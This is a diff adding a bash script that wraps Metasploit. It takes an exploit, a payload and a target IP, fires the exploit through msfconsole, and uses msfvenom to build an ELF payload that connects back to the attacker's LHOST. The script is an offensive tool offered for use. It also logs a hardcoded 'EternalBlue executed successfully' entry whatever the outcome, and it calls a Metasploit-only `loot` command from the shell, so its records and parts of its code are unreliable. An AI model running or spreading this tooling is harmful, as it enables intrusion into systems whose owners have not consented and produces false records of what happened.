@@ -1,0 +1,47 @@
+#!/bin/bash
+
+# Start PostgreSQL and Metasploit
+echo "Starting PostgreSQL and Metasploit..."
+sudo systemctl start postgresql
+sudo msfdb init
+
+# Request information before starting Metasploit
+echo "Select the exploit"
+read EXPLOIT
+
+echo "Select the payload"
+read PAYLOAD
+
+echo "Enter your LHOST"
+read LHOST
+
+echo "Enter your LPORT"
+read LPORT
+
+echo "Enter the target IP"
+read RHOST
+
+# Start Metasploit Console in non-interactive mode with all configured commands
+echo "Starting Metasploit Console..."
+msfconsole -q -x "
+use $EXPLOIT;
+set PAYLOAD $PAYLOAD;
+set LHOST $LHOST;
+set LPORT $LPORT;
+set RHOST $RHOST;
+exploit -z;
+exit;
+"
+
+# Save the notes to the CSV file
+echo "Saving the notes to notes.csv..."
+echo "$(date +%Y-%m-%d\ %H:%M:%S),$RHOST,SMB,445,TCP,Exploitation,MS17-010 EternalBlue exploit executed successfully" >> notes.csv
+
+# Document loot in CSV
+echo "Documenting loot..."
+loot -t csv
+
+# Create the payload
+echo "Creating the payload..."
+msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f elf > payload.elf
+echo "Payload created: payload.elf"
